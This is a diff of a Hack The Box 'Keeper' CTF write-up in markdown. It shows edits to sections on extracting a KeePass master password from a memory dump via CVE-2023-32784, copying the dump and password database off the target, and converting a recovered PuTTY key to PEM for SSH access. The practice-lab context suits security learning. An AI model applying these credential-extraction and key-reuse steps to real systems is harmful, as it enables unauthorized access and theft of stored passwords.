@@ -2,7 +2,7 @@
 title: HTB - Keeper
 date: 2023-11-21
 categories: [CTF Write Up, HTB]
-tags: []
+tags: [nmap, whatweb, wappalyzer, curl, request-tracker, default-credentials, ssh, netstat, keepass, cve-2023-32784, dmp, kdbx, putty, ppk, puttygen, pem]
 img_path: /assets/keeper/
 published: true
 ---
@@ -78,8 +78,6 @@ curl http://10.10.11.227
   </body>
 </html>
 ```
-
-> Add `tickets.keeper.htb` to `/etc/hosts`.
 
 <figure>
     <img src="hosts_file.png"
@@ -187,19 +185,18 @@ total 332820
 -rw-r----- 1 root      lnorgaard        33 Nov 21 17:22 user.txt
 ```
 
-> The DMP file is primarily associated with the MemoryDump or Minidump file format. It is used in Microsoft Windows operating system to store data that has been dumped from the memory space of the computer. Usually, DMP files are created when a file crashes or an error occurs.
+> The **DMP file** is primarily associated with the MemoryDump or Minidump file format. It is used in Microsoft Windows operating system to **store data that has been dumped from the memory space of the computer**. Usually, DMP files are created when a file crashes or an error occurs.
 
-> A KDBX file is a password database created by KeePass Password Safe, a free password manager for Windows. It stores an encrypted database of passwords that can be viewed only using a master password set by the user. KDBX files are used to securely store personal login credentials for Windows, email accounts, FTP sites, e-commerce sites, and other purposes.
+> A **KDBX file** is a **password database** created by _KeePass Password Safe_, a free password manager for Windows. It stores an encrypted database of passwords that **can be viewed only using a master password** set by the user. KDBX files are used to securely store personal login credentials for Windows, email accounts, FTP sites, e-commerce sites, and other purposes.
 
 <figure>
     <img src="nvd-cve.png"
     alt="CVE-2023-32784 description" >
 </figure>
 
-> [CVE-2023-32784 PoC](https://github.com/z-jxy/keepass_dump)
+> [CVE-2023-32784 PoC](https://github.com/z-jxy/keepass_dump): transfer `KeePassDumpFull.dmp` & `passcodes.kdbx` locally by opening a python3 http.server on the target and using `wget` from my machine.
 
-> Transferred `KeePassDumpFull.dmp` & `passcodes.kdbx` locally by opening a Python http.server from the target and using `wget` from my machine.
-
+```shell
 python3 keepass_dump.py -f ~/htb/keeper/KeePassDumpFull.dmp
 [*] Searching for masterkey characters
 [-] Couldn't find jump points in file. Scanning with slower method.
@@ -218,6 +215,7 @@ python3 keepass_dump.py -f ~/htb/keeper/KeePassDumpFull.dmp
 [*] 15: d
 [*] 16: e
 [*] Extracted: {UNKNOWN}dgrd med flde
+```
 
 <figure>
     <img src="danish_google.png"
@@ -240,6 +238,8 @@ keepass2
 
 > PuTTY's default format is `.ppk`: copy the contents on the note and copy it to a new file with `.ppk` file extension locally. Then, create a .pem key file using `puttygen`.
 
+> [SSH's man page](https://linux.die.net/man/1/ssh): ssh will simply ignore a private key file if it is accessible by others.
+
 ```shell
 puttygen key.ppk -O private-openssh -o key.pem
 chmod 400 key.pem
@@ -250,6 +250,8 @@ total 247476
 -rw-r--r-- 1 root root      1459 Nov 21 19:44 key.ppk
 -rw-r--r-- 1 kali kali      3630 May 24 11:51 passcodes.kdbx
 ```
+
+> [PEM files and SSH](https://www.howtogeek.com/devops/what-is-a-pem-file-and-how-do-you-use-it/): PEM files are also used for SSH. Your `~/.ssh/id_rsa` is a PEM file, just without the extension. You'll have to use the `-i` flag with ssh to specify that you want to use this new key instead of id_rsa.
 
 ## Privilege Escalation
 
